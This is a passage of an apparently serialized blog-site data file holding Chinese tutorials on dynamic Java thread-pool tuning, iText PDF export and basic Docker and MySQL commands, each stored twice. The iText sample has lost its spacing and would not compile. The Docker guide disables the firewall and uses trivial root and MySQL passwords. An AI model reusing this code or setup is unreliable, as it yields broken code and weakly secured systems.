这个过程中涉及到的面试题有哪些？\n\n问题一：线程池被创建后里面有线程吗？如果没有的话，你知道有什么方法对线程池进行预热吗？\n\n答：线程池被创建后如果没有任务过来，里面是不会有线程的。如果需要预热的话可以调用下面的两个方法：\n\nprestartCoreThread()和prestartAllCoreThreads()\n\n问题二：核心线程数会被回收吗？需要什么设置？\n\n答：核心线程数默认是不会被回收的，如果需要回收核心线程数，需要调用下面的方法：allowCoreThreadTimeOut();\n\n\n# 参考\n\nJava-线程池动态修改大小\n\njava动态线程池_可动态调节参数的线程池实现",normalizedContent:"线程池是一种基于池化思想管理线程的工具，使用线程池可以减少创建销毁线程的开销，避免线程过多导致系统资源耗尽。在高并发的任务处理场景，线程池的使用是必不可少的。在双11主项目中为了提升处理性能，很多地方使用到了线程池。随着线程池的使用，逐渐发现一个问题，线程池的参数如何设置？\n\n\n\n * 背景\n * 线程池任务调度机制\n * 动态调节线程池参数实现\n   * 调节核心和最大线程数的原理\n   * 调节工作队列大小的原理\n * 这个过程中涉及到的面试题有哪些？\n * 参考\n\n\n\n\n# 背景\n\n根据任务的类型，线程池可以区分为io密集型和cpu密集型，对于cpu密集型，一般经验是设置corepoolsize=cpu核数+1，对于io密集型需要根据具体的rt和流量来设置，没有普适的经验值。然而，我们一般遇到的情况多数是处理io密集型任务，如果线程池参数不可动态调节，就没办法根据实际情况实时调整处理速度，只能通过发布代码调整参数。\n\n如果线程池参数不合理会导致什么问题呢？下面列举几种可能出现的场景：最大线程数设置偏小，工作队列大小设置偏小，导致服务接口大量抛出rejectedexecutionexception。\n\n最大线程数设置偏小，工作队列大小设置过大，任务堆积过度，接口响应时长变长。\n\n最大线程数设置过大，线程调度开销增大，处理速度反而下降。\n\n核心线程数设置过小，流量突增时需要先创建线程，导致响应时长过大。\n\n核心线程数设置过大，空闲线程太多，占用系统资源。\n\n\n# 线程池任务调度机制\n\n要明白线程池参数对运行时的影响，就必须理解其中的原理，所以下面先简单总结了线程池的核心原理。\n\njava中的线程池核心实现类是threadpoolexecutor，threadpoolexecutor一方面维护自身的生命周期，另一方面同时管理线程和任务，使两者良好的结合从而执行并行任务。用户无需关注如何创建线程，如何调度线程来执行任务，用户只需提供runnable对象，将任务的运行逻辑提交到执行器(executor)中，由executor框架完成线程的调配和任务的执行部分。\n\nthreadpoolexecutor是如何运行，如何同时维护线程和执行任务的呢？其运行机制如下图所示：\n\n\n\n所有任务的调度都是由execute方法完成的，这部分完成的工作是：检查现在线程池的运行状态、运行线程数、运行策略，决定接下来执行的流程，是直接申请线程执行，或是缓冲到队列中执行，亦或是直接拒绝该任务。其执行过程如下：首先检测线程池运行状态，如果不是running，则直接拒绝，线程池要保证在running的状态下执行任务。\n\n如果workercount < corepoolsize，则创建并启动一个线程来执行新提交的任务。\n\n如果workercount >= corepoolsize，且线程池内的阻塞队列未满，则将任务添加到该阻塞队列中。\n\n如果workercount >= corepoolsize && workercount < maximumpoolsize，且线程池内的阻塞队列已满，则创建并启动一个线程来执行新提交的任务。\n\n如果workercount >= maximumpoolsize，并且线程池内的阻塞队列已满, 则根据拒绝策略来处理该任务, 默认的处理方式是直接抛异常。\n\n线程池参数中有几个比较关键的参数，分别是：\n\n 1. corepoolsize：核心线程数大小，不管它们创建以后是不是空闲的。线程池需要保持 corepoolsize 数量的线程，除非设置了 allowcorethreadtimeout；\n 2. maximumpoolsize：最大线程数，线程池中最多允许创建 maximumpoolsize 个线程;\n 3. keepalivetime：存活时间，如果经过 keepalivetime 时间后，超过核心线程数的线程还没有接受到新的任务，那就回收;\n 4. unit： keepalivetime 的时间单位;\n 5. workqueue：存放待执行任务的队列：当提交的任务数超过核心线程数大小后，再提交的任务就存放在这里。它仅仅用来存放被 execute 方法提交的 runnable 任务; 目前jdk提供了以下阻塞队列的实现：\n\n\n\n 6. threadfactory：线程工厂，用来创建线程工厂。比如这里面可以自定义线程名称，当进行虚拟机栈分析时，看着名字就知道这个线程是哪里来的，不会懵逼；\n 7. handler ：拒绝策略，当队列里面放满了任务、最大线程数的线程都在工作时，这时继续提交的任务线程池就处理不了，应该执行怎么样的拒绝策略；\n\n\n\n\n# 动态调节线程池参数实现\n\n线程池相关的重要参数有三个，分别是核心线程数、最大线程数和工作队列大小，接下来将阐述如何实现动态调节线程池参数。\n\n\n# 调节核心和最大线程数的原理\n\nthreadpoolexecutor已经提供了两个方法在运行时设置核心线程数和最大线程数，分别是threadpoolexecutor.setcorepoolsize()和threadpoolexecutor.setmaximumpoolsize()。\n\nsetcorepoolsize方法的执行流程是：首先会覆盖之前构造函数设置的corepoolsize，然后，如果新的值比原始值要小，当多余的工作线程下次变成空闲状态的时候会被中断并销毁，如果新的值比原来的值要大且工作队列不为空，则会创建新的工作线程。流程图如下：\n\nsetmaximumpoolsize方法执行流程是：首先会覆盖之前构造函数设置的maximumpoolsize，然后，如果新的值比原来的值要小，当多余的工作线程下次变成空闲状态的时候会被中断并销毁。\n\n代码设置：\n\n\n\n\n# 调节工作队列大小的原理\n\n线程池中是以生产者消费者模式，通过一个阻塞队列来缓存任务，工作线程从阻塞队列中获取任务。工作队列的接口是阻塞队列(blockingqueue)，在队列为空时，获取元素的线程会等待队列变为非空，当队列满时，存储元素的线程会等待队列可用。\n\n目前jdk提供了以下阻塞队列的实现：\n\n\n\n但是很不幸，这些阻塞队列的实现都不支持动态调整大小，那么为什么不自己实现一个可动态调整大小的阻塞队列呢。重复造轮子是不可取的，所以选择改造轮子。linkedblockingqueue是比较常用的一个阻塞队列，它无法修改大小的原因是capacity字段设置成了final private final int capacity;。如果把final去掉，并提供修改capacity的方法，是不是就满足我们的需求呢？事实证明是可行的。\n\n所以要想动态修改只能自己实现一个blockingqueue，然后capacity可以动态修改即可；复制一个linkedblockingqueue源码，将capacity的final修饰去掉，添加set方法，保存为resizablecapacitylinkedblockingqueue.java即可，然后使用resizablecapacitylinkedblockingqueue作为任务队列；\n\n\n\n\n# 这个过程中涉及到的面试题有哪些？\n\n问题一：线程池被创建后里面有线程吗？如果没有的话，你知道有什么方法对线程池进行预热吗？\n\n答：线程池被创建后如果没有任务过来，里面是不会有线程的。如果需要预热的话可以调用下面的两个方法：\n\nprestartcorethread()和prestartallcorethreads()\n\n问题二：核心线程数会被回收吗？需要什么设置？\n\n答：核心线程数默认是不会被回收的，如果需要回收核心线程数，需要调用下面的方法：allowcorethreadtimeout();\n\n\n# 参考\n\njava-线程池动态修改大小\n\njava动态线程池_可动态调节参数的线程池实现",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"iText：PDF导出",frontmatter:{title:"iText：PDF导出",date:"2019-10-07T20:53:26.000Z",sidebar:!0,tags:["Java","pdf"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/itext.html",relativePath:"views/backend/itext.md",key:"v-17d55e14",path:"/views/backend/itext.html",headers:[{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:3},{level:2,title:"使用场景",slug:"使用场景",normalizedTitle:"使用场景",charIndex:9},{level:3,title:"生成图示",slug:"生成图示",normalizedTitle:"生成图示",charIndex:19},{level:2,title:"简要步骤",slug:"简要步骤",normalizedTitle:"简要步骤",charIndex:27},{level:2,title:"SpringBoot中使用iText",slug:"springboot中使用itext",normalizedTitle:"springboot中使用itext",charIndex:35},{level:3,title:"添加依赖",slug:"添加依赖",normalizedTitle:"添加依赖",charIndex:59},{level:3,title:"一个简单PDF生成",slug:"一个简单pdf生成",normalizedTitle:"一个简单pdf生成",charIndex:69},{level:2,title:"其它",slug:"其它",normalizedTitle:"其它",charIndex:82}],headersStr:"简介 使用场景 生成图示 简要步骤 SpringBoot中使用iText 添加依赖 一个简单PDF生成 其它",content:' * 简介\n * 使用场景\n   * 生成图示\n * 简要步骤\n * SpringBoot中使用iText\n   * 添加依赖\n   * 一个简单PDF生成\n * 其它\n\n\n\n\n# 简介\n\n> 官网：https://itextpdf.com\n\n * iText是著名的开放源码的站点sourceforge一个项目，是用于生成PDF文档的一个java类库。通过iText不仅可以生成PDF或rtf的文档，而且可以将XML、Html文件转化为PDF文件。\n\n\n# 使用场景\n\n * 简单的：Java生成PDF报表、文档或其它（PDF中可以添加文字、图片、水印等）\n * 复杂的：结合echarts、phantomjs动态生成echar图片插入PDF中\n\n\n# 生成图示\n\n\n\n\n\n * 图示这个比较复杂，具体代码可见git或联系我\n\n\n# 简要步骤\n\n * 用iText生成PDF文档需要5个步骤：\n   \n   ① 建立com.itextpdf.text.Document对象的实例。\n   \n   Document document= new Document();\n   \n   ② 建立一个书写器(Writer)与document对象关联，通过书写器(Writer)可以将文档写入到磁盘中。\n   \n   PDFWriter.getInstance(document,new FileOutputStream("D:\\\\\\ITextTest.pdf"));\n   \n   ③ 打开文档。\n   \n   document.open();\n   \n   ④ 向文档中添加内容。\n   \n   document.add(newParagraph("IText Test"));\n   \n   ⑤ 关闭文档。\n   \n   document.close();\n   \n   通过上面的5个步骤，就能产生一个ITextTest.PDF的文件，文件内容为"ITextTest"。\n\n\n# SpringBoot中使用iText\n\n\n# 添加依赖\n\n\x3c!-- itext方式导出pdf --\x3e\n<dependency>\n    <groupId>com.itextpdf</groupId>\n    <artifactId>itextpdf</artifactId>\n    <version>5.5.10</version>\n</dependency>\n<dependency>\n    <groupId>com.itextpdf</groupId>\n    <artifactId>itext-asian</artifactId>\n    <version>5.2.0</version>\n</dependency>\t\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 一个简单PDF生成\n\npackage com.wh;\n \nimportjava.io.FileOutputStream;\nimportcom.itextpdf.text.BaseColor;\nimportcom.itextpdf.text.Document;\nimportcom.itextpdf.text.Element;\nimportcom.itextpdf.text.Font;\nimportcom.itextpdf.text.Paragraph;\nimportcom.itextpdf.text.Rectangle;\nimportcom.itextpdf.text.pdf.BaseFont;\nimportcom.itextpdf.text.pdf.PdfPTable;\nimportcom.itextpdf.text.pdf.PdfWriter;\n \npublic class ToPDF{\n       // 表头\n       public static final String[] tableHeader= { "姓名", "性别", "年龄",\n                     "学院", "专业", "年级"};\n \n       // 数据表字段数\n       private static final int colNumber = 6;\n \n       // 表格的设置\n       private static final int spacing = 2;\n \n       // 表格的设置\n       private static final int padding = 2;\n \n       // 导出Pdf文挡\n       public static void exportPdfDocument() {\n              // 创建文Pdf文挡50, 50, 50,50左右上下距离\n              Document document = newDocument(new Rectangle(1500, 2000), 50, 50, 50,\n                            50);\n              try {\n                     //使用PDFWriter进行写文件操作\n                     PdfWriter.getInstance(document,new FileOutputStream(\n                                   "d:\\\\学生信息.pdf"));\n                     document.open();\n                     // 中文字体\n                     BaseFont bfChinese =BaseFont.createFont("STSong-Light",\n                                   "UniGB-UCS2-H",BaseFont.NOT_EMBEDDED);\n                     Font fontChinese = newFont(bfChinese, 12, Font.NORMAL);\n                     // 创建有colNumber(6)列的表格\n                     PdfPTable datatable = newPdfPTable(colNumber);\n                     //定义表格的宽度\n                     int[] cellsWidth = { 8, 2,2, 8, 5, 3 };\n                     datatable.setWidths(cellsWidth);\n                     // 表格的宽度百分比\n                     datatable.setWidthPercentage(100);\n                     datatable.getDefaultCell().setPadding(padding);\n                     datatable.getDefaultCell().setBorderWidth(spacing);\n                     //设置表格的底色\n                     datatable.getDefaultCell().setBackgroundColor(BaseColor.GREEN);\n                     datatable.getDefaultCell().setHorizontalAlignment(\n                                   Element.ALIGN_CENTER);\n                     // 添加表头元素\n                     for (int i = 0; i <colNumber; i++) {\n                            datatable.addCell(newParagraph(tableHeader[i], fontChinese));\n                     }\n                     // 添加子元素\n                     for (int i = 0; i <colNumber; i++) {\n                            datatable.addCell(newParagraph(tableHeader[i], fontChinese));\n                     }\n                     document.add(datatable);\n              } catch (Exception e) {\n                     e.printStackTrace();\n              }\n              document.close();\n       }\n \n       public static void main(String[] args)throws Exception {\n              exportPdfDocument();\n       }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n\n\n\n# 其它\n\nJava操作PDF之iText超入门\n\niText API',normalizedContent:' * 简介\n * 使用场景\n   * 生成图示\n * 简要步骤\n * springboot中使用itext\n   * 添加依赖\n   * 一个简单pdf生成\n * 其它\n\n\n\n\n# 简介\n\n> 官网：https://itextpdf.com\n\n * itext是著名的开放源码的站点sourceforge一个项目，是用于生成pdf文档的一个java类库。通过itext不仅可以生成pdf或rtf的文档，而且可以将xml、html文件转化为pdf文件。\n\n\n# 使用场景\n\n * 简单的：java生成pdf报表、文档或其它（pdf中可以添加文字、图片、水印等）\n * 复杂的：结合echarts、phantomjs动态生成echar图片插入pdf中\n\n\n# 生成图示\n\n\n\n\n\n * 图示这个比较复杂，具体代码可见git或联系我\n\n\n# 简要步骤\n\n * 用itext生成pdf文档需要5个步骤：\n   \n   ① 建立com.itextpdf.text.document对象的实例。\n   \n   document document= new document();\n   \n   ② 建立一个书写器(writer)与document对象关联，通过书写器(writer)可以将文档写入到磁盘中。\n   \n   pdfwriter.getinstance(document,new fileoutputstream("d:\\\\\\itexttest.pdf"));\n   \n   ③ 打开文档。\n   \n   document.open();\n   \n   ④ 向文档中添加内容。\n   \n   document.add(newparagraph("itext test"));\n   \n   ⑤ 关闭文档。\n   \n   document.close();\n   \n   通过上面的5个步骤，就能产生一个itexttest.pdf的文件，文件内容为"itexttest"。\n\n\n# springboot中使用itext\n\n\n# 添加依赖\n\n\x3c!-- itext方式导出pdf --\x3e\n<dependency>\n    <groupid>com.itextpdf</groupid>\n    <artifactid>itextpdf</artifactid>\n    <version>5.5.10</version>\n</dependency>\n<dependency>\n    <groupid>com.itextpdf</groupid>\n    <artifactid>itext-asian</artifactid>\n    <version>5.2.0</version>\n</dependency>\t\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 一个简单pdf生成\n\npackage com.wh;\n \nimportjava.io.fileoutputstream;\nimportcom.itextpdf.text.basecolor;\nimportcom.itextpdf.text.document;\nimportcom.itextpdf.text.element;\nimportcom.itextpdf.text.font;\nimportcom.itextpdf.text.paragraph;\nimportcom.itextpdf.text.rectangle;\nimportcom.itextpdf.text.pdf.basefont;\nimportcom.itextpdf.text.pdf.pdfptable;\nimportcom.itextpdf.text.pdf.pdfwriter;\n \npublic class topdf{\n       // 表头\n       public static final string[] tableheader= { "姓名", "性别", "年龄",\n                     "学院", "专业", "年级"};\n \n       // 数据表字段数\n       private static final int colnumber = 6;\n \n       // 表格的设置\n       private static final int spacing = 2;\n \n       // 表格的设置\n       private static final int padding = 2;\n \n       // 导出pdf文挡\n       public static void exportpdfdocument() {\n              // 创建文pdf文挡50, 50, 50,50左右上下距离\n              document document = newdocument(new rectangle(1500, 2000), 50, 50, 50,\n                            50);\n              try {\n                     //使用pdfwriter进行写文件操作\n                     pdfwriter.getinstance(document,new fileoutputstream(\n                                   "d:\\\\学生信息.pdf"));\n                     document.open();\n                     // 中文字体\n                     basefont bfchinese =basefont.createfont("stsong-light",\n                                   "unigb-ucs2-h",basefont.not_embedded);\n                     font fontchinese = newfont(bfchinese, 12, font.normal);\n                     // 创建有colnumber(6)列的表格\n                     pdfptable datatable = newpdfptable(colnumber);\n                     //定义表格的宽度\n                     int[] cellswidth = { 8, 2,2, 8, 5, 3 };\n                     datatable.setwidths(cellswidth);\n                     // 表格的宽度百分比\n                     datatable.setwidthpercentage(100);\n                     datatable.getdefaultcell().setpadding(padding);\n                     datatable.getdefaultcell().setborderwidth(spacing);\n                     //设置表格的底色\n                     datatable.getdefaultcell().setbackgroundcolor(basecolor.green);\n                     datatable.getdefaultcell().sethorizontalalignment(\n                                   element.align_center);\n                     // 添加表头元素\n                     for (int i = 0; i <colnumber; i++) {\n                            datatable.addcell(newparagraph(tableheader[i], fontchinese));\n                     }\n                     // 添加子元素\n                     for (int i = 0; i <colnumber; i++) {\n                            datatable.addcell(newparagraph(tableheader[i], fontchinese));\n                     }\n                     document.add(datatable);\n              } catch (exception e) {\n                     e.printstacktrace();\n              }\n              document.close();\n       }\n \n       public static void main(string[] args)throws exception {\n              exportpdfdocument();\n       }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n\n\n\n# 其它\n\njava操作pdf之itext超入门\n\nitext api',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Docker 基本了解和使用",frontmatter:{title:"Docker 基本了解和使用",date:"2018-06-09T09:56:47.000Z",tags:["Docker"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/docker.html",relativePath:"views/backend/docker.md",key:"v-3bebd770",path:"/views/backend/docker.html",headers:[{level:2,title:"1、简介",slug:"_1、简介",normalizedTitle:"1、简介",charIndex:37},{level:2,title:"2、核心概念",slug:"_2、核心概念",normalizedTitle:"2、核心概念",charIndex:45},{level:2,title:"3、安装Docker",slug:"_3、安装docker",normalizedTitle:"3、安装docker",charIndex:55},{level:3,title:"1）、安装linux虚拟机",slug:"_1-、安装linux虚拟机",normalizedTitle:"1）、安装linux虚拟机",charIndex:71},{level:3,title:"2）、在linux虚拟机上安装docker",slug:"_2-、在linux虚拟机上安装docker",normalizedTitle:"2）、在linux虚拟机上安装docker",charIndex:90},{level:2,title:"4、Docker常用命令&操作",slug:"_4、docker常用命令-操作",normalizedTitle:"4、docker常用命令&amp;操作",charIndex:null},{level:3,title:"1）、镜像操作",slug:"_1-、镜像操作",normalizedTitle:"1）、镜像操作",charIndex:136},{level:3,title:"2）、容器操作",slug:"_2-、容器操作",normalizedTitle:"2）、容器操作",charIndex:149},{level:3,title:"3）、安装MySQL示例",slug:"_3-、安装mysql示例",normalizedTitle:"3）、安装mysql示例",charIndex:162},{level:2,title:"5、其它",slug:"_5、其它",normalizedTitle:"5、其它",charIndex:178}],excerpt:"<Boxx/>\n<p><strong>Docker</strong>是一个开源的应用容器引擎，是一个轻量级容器技术。</p>\n",headersStr:"1、简介 2、核心概念 3、安装Docker 1）、安装linux虚拟机 2）、在linux虚拟机上安装docker 4、Docker常用命令&操作 1）、镜像操作 2）、容器操作 3）、安装MySQL示例 5、其它",content:'Docker是一个开源的应用容器引擎，是一个轻量级容器技术。\n\n\n\n * 1、简介\n * 2、核心概念\n * 3、安装Docker\n   * 1）、安装linux虚拟机\n   * 2）、在linux虚拟机上安装docker\n * 4、Docker常用命令&操作\n   * 1）、镜像操作\n   * 2）、容器操作\n   * 3）、安装MySQL示例\n * 5、其它\n\n\n\n\n# 1、简介\n\nDocker支持将软件编译成一个镜像；然后在镜像中各种软件做好配置，将镜像发布出去，其他使用者可以直接使用这个镜像；\n\n运行中的这个镜像称为容器，容器启动是非常快速的。\n\n\n\n\n\n\n# 2、核心概念\n\ndocker主机(Host)：安装了Docker程序的机器（Docker直接安装在操作系统之上）；\n\ndocker客户端(Client)：连接docker主机进行操作；\n\ndocker仓库(Registry)：用来保存各种打包好的软件镜像；\n\ndocker镜像(Images)：软件打包好的镜像；放在docker仓库中；\n\ndocker容器(Container)：镜像启动后的实例称为一个容器；容器是独立运行的一个或一组应用\n\n\n\n使用Docker的步骤：\n\n1）、安装Docker\n\n2）、去Docker仓库找到这个软件对应的镜像；\n\n3）、使用Docker运行这个镜像，这个镜像就会生成一个Docker容器；\n\n4）、对容器的启动停止就是对软件的启动停止；\n\n\n# 3、安装Docker\n\n\n# 1）、安装linux虚拟机\n\n1）、VMWare、VirtualBox（安装）；\n\n2）、导入虚拟机文件centos7；（安装linux）\n\n3）、双击启动linux虚拟机;使用 root/ 123456登陆\n\n4）、使用客户端连接linux服务器进行命令操作；\n\n5）、设置虚拟机网络；\n\n桥接网络===选好网卡====接入网线；\n\n6）、设置好网络以后使用命令重启虚拟机的网络\n\nservice network restart\n\n\n1\n\n\n7）、查看linux的ip地址\n\nip addr\n\n\n1\n\n\n8）、使用客户端连接linux；\n\n\n# 2）、在linux虚拟机上安装docker\n\n步骤：\n\n1、检查内核版本，必须是3.10及以上\nuname -r\n2、安装docker\nyum install docker\n3、输入y确认安装\n4、启动docker\n[root@localhost ~]# systemctl start docker\n[root@localhost ~]# docker -v\nDocker version 1.12.6, build 3e8e77d/1.12.6\n5、开机启动docker\n[root@localhost ~]# systemctl enable docker\nCreated symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.\n6、停止docker\nsystemctl stop docker\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 4、Docker常用命令&操作\n\n\n# 1）、镜像操作\n\n操作   命令                                         说明\n检索   docker search 关键字 eg：docker search redis   我们经常去docker hub上检索镜像的详细信息，如镜像的TAG。\n拉取   docker pull 镜像名:tag                        :tag是可选的，tag表示标签，多为软件的版本，默认是latest\n列表   docker images                              查看所有本地镜像\n删除   docker rmi image-id                        删除指定的本地镜像\n\nhttps://hub.docker.com/\n\n\n# 2）、容器操作\n\n软件镜像（QQ安装程序）----运行镜像----产生一个容器（正在运行的软件，运行的QQ）；\n\n步骤：\n\n1、搜索镜像\n[root@localhost ~]# docker search tomcat\n2、拉取镜像\n[root@localhost ~]# docker pull tomcat\n3、根据镜像启动容器\ndocker run --name mytomcat -d tomcat:latest\n4、docker ps\n查看运行中的容器\n5、 停止运行中的容器\ndocker stop  容器的id\n6、查看所有的容器\ndocker ps -a\n7、启动容器\ndocker start 容器id\n8、删除一个容器\n docker rm 容器id\n9、启动一个做了端口映射的tomcat\n[root@localhost ~]# docker run -d -p 8888:8080 tomcat\n-d：后台运行\n-p: 将主机的端口映射到容器的一个端口    主机端口:容器内部的端口\n\n10、为了演示简单关闭了linux的防火墙\nservice firewalld status ；查看防火墙状态\nservice firewalld stop：关闭防火墙\n11、查看容器的日志\ndocker logs container-name/container-id\n\n更多命令参看\nhttps://docs.docker.com/engine/reference/commandline/docker/\n可以参考每一个镜像的文档\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# 3）、安装MySQL示例\n\ndocker pull mysql\n\n\n1\n\n\n错误的启动\n\n[root@localhost ~]# docker run --name mysql01 -d mysql\n42f09819908bb72dd99ae19e792e0a5d03c48638421fa64cce5f8ba0f40f5846\n\nmysql退出了\n[root@localhost ~]# docker ps -a\nCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                           PORTS               NAMES\n42f09819908b        mysql               "docker-entrypoint.sh"   34 seconds ago      Exited (1) 33 seconds ago                            mysql01\n538bde63e500        tomcat              "catalina.sh run"        About an hour ago   Exited (143) About an hour ago                       compassionate_\ngoldstine\nc4f1ac60b3fc        tomcat              "catalina.sh run"        About an hour ago   Exited (143) About an hour ago                       lonely_fermi\n81ec743a5271        tomcat              "catalina.sh run"        About an hour ago   Exited (143) About an hour ago                       sick_ramanujan\n\n\n//错误日志\n[root@localhost ~]# docker logs 42f09819908b\nerror: database is uninitialized and password option is not specified\n  You need to specify one of MYSQL_ROOT_PASSWORD, MYSQL_ALLOW_EMPTY_PASSWORD and MYSQL_RANDOM_ROOT_PASSWORD；这个三个参数必须指定一个\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n正确的启动\n\n[root@localhost ~]# docker run --name mysql01 -e MYSQL_ROOT_PASSWORD=123456 -d mysql\nb874c56bec49fb43024b3805ab51e9097da779f2f572c22c695305dedd684c5f\n[root@localhost ~]# docker ps\nCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES\nb874c56bec49        mysql               "docker-entrypoint.sh"   4 seconds ago       Up 3 seconds        3306/tcp            mysql01\n\n\n1\n2\n3\n4\n5\n\n\n做了端口映射\n\n[root@localhost ~]# docker run -p 3306:3306 --name mysql02 -e MYSQL_ROOT_PASSWORD=123456 -d mysql\nad10e4bc5c6a0f61cbad43898de71d366117d120e39db651844c0e73863b9434\n[root@localhost ~]# docker ps\nCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES\nad10e4bc5c6a        mysql               "docker-entrypoint.sh"   4 seconds ago       Up 2 seconds        0.0.0.0:3306->3306/tcp   mysql02\n\n\n1\n2\n3\n4\n5\n\n\n几个其他的高级操作\n\ndocker run --name mysql03 -v /conf/mysql:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag\n把主机的/conf/mysql文件夹挂载到 mysqldocker容器的/etc/mysql/conf.d文件夹里面\n改mysql的配置文件就只需要把mysql配置文件放在自定义的文件夹下（/conf/mysql）\n\ndocker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci\n指定mysql的一些配置参数\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 5、其它\n\n * 开发者必备Docker命令\n * 使用Maven插件构建Docker镜像\n * Docker在Linux下的各种操作\n * 使用Dockerfile为SpringBoot应用构建Docker镜像\n * 使用Docker Compose部署SpringBoot应用',normalizedContent:'docker是一个开源的应用容器引擎，是一个轻量级容器技术。\n\n\n\n * 1、简介\n * 2、核心概念\n * 3、安装docker\n   * 1）、安装linux虚拟机\n   * 2）、在linux虚拟机上安装docker\n * 4、docker常用命令&操作\n   * 1）、镜像操作\n   * 2）、容器操作\n   * 3）、安装mysql示例\n * 5、其它\n\n\n\n\n# 1、简介\n\ndocker支持将软件编译成一个镜像；然后在镜像中各种软件做好配置，将镜像发布出去，其他使用者可以直接使用这个镜像；\n\n运行中的这个镜像称为容器，容器启动是非常快速的。\n\n\n\n\n\n\n# 2、核心概念\n\ndocker主机(host)：安装了docker程序的机器（docker直接安装在操作系统之上）；\n\ndocker客户端(client)：连接docker主机进行操作；\n\ndocker仓库(registry)：用来保存各种打包好的软件镜像；\n\ndocker镜像(images)：软件打包好的镜像；放在docker仓库中；\n\ndocker容器(container)：镜像启动后的实例称为一个容器；容器是独立运行的一个或一组应用\n\n\n\n使用docker的步骤：\n\n1）、安装docker\n\n2）、去docker仓库找到这个软件对应的镜像；\n\n3）、使用docker运行这个镜像，这个镜像就会生成一个docker容器；\n\n4）、对容器的启动停止就是对软件的启动停止；\n\n\n# 3、安装docker\n\n\n# 1）、安装linux虚拟机\n\n1）、vmware、virtualbox（安装）；\n\n2）、导入虚拟机文件centos7；（安装linux）\n\n3）、双击启动linux虚拟机;使用 root/ 123456登陆\n\n4）、使用客户端连接linux服务器进行命令操作；\n\n5）、设置虚拟机网络；\n\n桥接网络===选好网卡====接入网线；\n\n6）、设置好网络以后使用命令重启虚拟机的网络\n\nservice network restart\n\n\n1\n\n\n7）、查看linux的ip地址\n\nip addr\n\n\n1\n\n\n8）、使用客户端连接linux；\n\n\n# 2）、在linux虚拟机上安装docker\n\n步骤：\n\n1、检查内核版本，必须是3.10及以上\nuname -r\n2、安装docker\nyum install docker\n3、输入y确认安装\n4、启动docker\n[root@localhost ~]# systemctl start docker\n[root@localhost ~]# docker -v\ndocker version 1.12.6, build 3e8e77d/1.12.6\n5、开机启动docker\n[root@localhost ~]# systemctl enable docker\ncreated symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.\n6、停止docker\nsystemctl stop docker\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 4、docker常用命令&操作\n\n\n# 1）、镜像操作\n\n操作   命令                                         说明\n检索   docker search 关键字 eg：docker search redis   我们经常去docker hub上检索镜像的详细信息，如镜像的tag。\n拉取   docker pull 镜像名:tag                        :tag是可选的，tag表示标签，多为软件的版本，默认是latest\n列表   docker images                              查看所有本地镜像\n删除   docker rmi image-id                        删除指定的本地镜像\n\nhttps://hub.docker.com/\n\n\n# 2）、容器操作\n\n软件镜像（qq安装程序）----运行镜像----产生一个容器（正在运行的软件，运行的qq）；\n\n步骤：\n\n1、搜索镜像\n[root@localhost ~]# docker search tomcat\n2、拉取镜像\n[root@localhost ~]# docker pull tomcat\n3、根据镜像启动容器\ndocker run --name mytomcat -d tomcat:latest\n4、docker ps\n查看运行中的容器\n5、 停止运行中的容器\ndocker stop  容器的id\n6、查看所有的容器\ndocker ps -a\n7、启动容器\ndocker start 容器id\n8、删除一个容器\n docker rm 容器id\n9、启动一个做了端口映射的tomcat\n[root@localhost ~]# docker run -d -p 8888:8080 tomcat\n-d：后台运行\n-p: 将主机的端口映射到容器的一个端口    主机端口:容器内部的端口\n\n10、为了演示简单关闭了linux的防火墙\nservice firewalld status ；查看防火墙状态\nservice firewalld stop：关闭防火墙\n11、查看容器的日志\ndocker logs 